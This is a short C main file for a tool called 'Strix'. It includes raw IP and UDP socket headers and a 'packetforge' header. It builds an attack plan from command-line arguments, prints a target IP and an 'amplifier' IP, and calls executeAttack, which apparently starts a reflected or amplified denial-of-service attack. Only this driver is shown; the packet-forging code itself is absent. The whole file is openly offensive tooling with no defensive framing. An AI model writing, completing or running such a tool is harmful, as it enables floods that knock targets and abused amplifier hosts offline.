
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

#include "c.h"
#include "packetforge.h"
#include "strix.h"
#include "cli.h"

int main(int argc, char **argv)
{

    
  AttackPlan * plan = createAttackPlan(argc, argv);
  fprintf(stdout, "Strix\n");
  
  fprintf(stdout, "target:%s\n", plan->target_ip);
  fprintf(stdout, "amplifier:%s\n", plan->amp_ip);
  executeAttack( plan );
  fprintf(stdout, "Good Bye\n");
  free(plan);
  return 0;

}
